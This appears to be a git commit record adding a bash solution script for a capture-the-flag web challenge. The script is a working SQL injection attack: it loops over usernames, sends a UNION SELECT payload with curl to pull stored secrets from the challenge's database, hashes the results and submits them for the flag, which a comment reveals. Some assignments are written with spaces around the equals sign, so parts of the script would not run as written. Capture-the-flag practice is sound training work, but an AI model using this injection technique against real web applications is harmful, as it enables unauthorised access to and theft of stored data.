4a7b95d50df1aa9b20f5875bd3cb11b4b7d4bdfb
James Wang <jameswang9909@hotmail.com>
2016-03-21 12:27:36 -0400

    Oops I actually solved Web D

---
+++ Web-D_200-WITHHELD/solution.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+url="http://web.camsctf.com/13/user.php"
+hashes=""
+
+while read user; do
+    response=$(curl -s $url --data "input=' UNION SELECT s3crets from cr3wm3mberz WHERE us3rname = \"$user\" -- ")
+    hashes=${hashes}$response
+done < users.txt
+
+hashes = $(echo $hashes | sed "s/<br>//g")
+
+password=$(python -c "import hashlib; print hashlib.md5('$hashes').hexdigest()")
+
+echo "The password is $password"
+
+flag = $(curl http://web.camsctf.com/13/check.php --data "answer=$password")
+echo $flag
+
+# {i_hack_so_much_sqlz}
